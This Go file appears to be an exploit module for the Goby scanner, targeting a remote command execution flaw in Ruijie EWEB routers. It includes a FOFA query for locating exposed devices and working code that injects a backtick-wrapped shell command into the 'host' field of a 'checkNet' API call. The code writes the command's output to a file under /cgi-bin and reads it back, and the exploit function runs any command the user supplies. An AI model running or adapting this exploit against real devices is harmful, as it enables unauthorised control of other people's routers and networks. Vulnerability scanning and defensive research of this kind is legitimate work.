package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Ruijie EWEB auth RCE",
    "Description": "<p>Ruijie Ruiyi is a sub-brand of Ruijie Network for the business market. With easy network, switch, router, wireless, security, cloud services six product lines, solutions cover commercial retail, hotels, K T V, Internet cafes, monitoring and security, logistics, warehousing, manufacturing. Through this vulnerability, the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.</p>",
    "Product": "Ruijie  Ruiyi Route",
    "Homepage": "https://www.ruijiery.com",
    "DisclosureDate": "2022-06-14",
    "Author": "i@rce.moe",
    "FofaQuery": "body=\"cgi-bin/luci\" && body=\"#f47f3e\"",
    "GobyQuery": "body=\"cgi-bin/luci\" && body=\"#f47f3e\"",
    "Level": "2",
    "Impact": "<p>Through this vulnerability, the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.</p>",
    "Recommendation": "<p>Vendor has released leaks fixes, please pay attention to update: https://www.ruijiery.com/<a href=\"https://www.sangfor.com.cn\"></a></p>",
    "References": [
        "https://fofa.so"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "锐捷 EWEB auth 远程命令执行漏洞",
            "Product": "锐捷 睿易路由",
            "Description": "<p>锐捷睿易是锐捷网络面向商务市场的子品牌。拥有便捷的网络、交换机、路由器、无线、安全、云服务六大产品线，解决方案涵盖商业零售、酒店、kt、网吧、监控与安全、物流、仓储、制造。通过该漏洞，攻击者可以任意执行服务器端的代码，编写后门，获得服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：&nbsp;<a href=\"https://www.ruijiery.com/\">https://www.ruijiery.com/</a><br></p>",
            "Impact": "<p><span style=\"font-size: 16px;\">攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ruijie EWEB auth RCE",
            "Product": "Ruijie  Ruiyi Route",
            "Description": "<p>Ruijie Ruiyi is a sub-brand of Ruijie Network for the business market. With easy network, switch, router, wireless, security, cloud services six product lines, solutions cover commercial retail, hotels, K T V, Internet cafes, monitoring and security, logistics, warehousing, manufacturing. Through this vulnerability, the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.<br></p>",
            "Recommendation": "<p>Vendor has released leaks fixes, please pay attention to update:&nbsp;<span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\"><a href=\"https://www.ruijiery.com/\">https://www.ruijiery.com/</a></span><a href=\"https://www.sangfor.com.cn\"></a><br></p>",
            "Impact": "<p>Through this vulnerability, the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10692"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(8)
			filename_randomStr := goutils.RandomHexString(8)
			uri := "/cgi-bin/luci/api/auth"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/json")
			cfg.Data = "{\"method\":\"checkNet\",\"params\":{\"host\":\"`echo " + randomStr + ">" + filename_randomStr + ".txt`\"}}"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "false") {
					uri_2 := "/cgi-bin/" + filename_randomStr + ".txt"
					cfg_2 := httpclient.NewGetRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					cfg_2.FollowRedirect = false
					cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
					if resp, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randomStr)
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["Cmd"].(string)
			filename_randomStr := goutils.RandomHexString(8)
			uri := "/cgi-bin/luci/api/auth"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/json")
			cfg.Data = "{\"method\":\"checkNet\",\"params\":{\"host\":\"`" + cmd + ">" + filename_randomStr + ".txt`\"}}"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "false") {
					uri_2 := "/cgi-bin/" + filename_randomStr + ".txt"
					cfg_2 := httpclient.NewGetRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					cfg_2.FollowRedirect = false
					cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
						expResult.Output = resp.Utf8Html
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
